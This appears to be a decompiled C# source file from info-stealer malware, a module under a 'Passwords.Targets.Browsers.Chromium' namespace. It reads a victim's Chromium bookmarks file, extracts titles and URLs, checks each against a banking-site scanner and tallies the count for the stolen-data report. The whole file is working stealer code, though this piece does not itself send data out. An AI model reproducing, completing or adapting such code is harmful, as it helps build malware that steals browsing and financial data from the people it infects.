using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Browsers.Chromium;

internal sealed class Bookmarks
{
	public static List<Bookmark> Get(string sBookmarks)
	{
		try
		{
			List<Bookmark> list = new List<Bookmark>();
			if (!File.Exists(sBookmarks))
			{
				return list;
			}
			string[] array = Regex.Split(Regex.Split(Regex.Split(File.ReadAllText(sBookmarks, Encoding.UTF8), "      \"bookmark_bar\": {")[1], "      \"other\": {")[0], "},");
			foreach (string text in array)
			{
				if (!text.Contains("\"name\": \"") || !text.Contains("\"type\": \"url\",") || !text.Contains("\"url\": \"http"))
				{
					continue;
				}
				int num = 0;
				string[] array2 = Regex.Split(text, Parser.separator);
				foreach (string data in array2)
				{
					num++;
					Bookmark item = default(Bookmark);
					if (Parser.DetectTitle(data))
					{
						item.sTitle = Parser.Get(text, num);
						item.sUrl = Parser.Get(text, num + 2);
						if (!string.IsNullOrEmpty(item.sTitle) && !string.IsNullOrEmpty(item.sUrl) && !item.sUrl.Contains("Failed to parse url"))
						{
							Banking.ScanData(item.sUrl);
							Counter.Bookmarks++;
							list.Add(item);
						}
					}
				}
			}
			return list;
		}
		catch
		{
			return new List<Bookmark>();
		}
	}
}
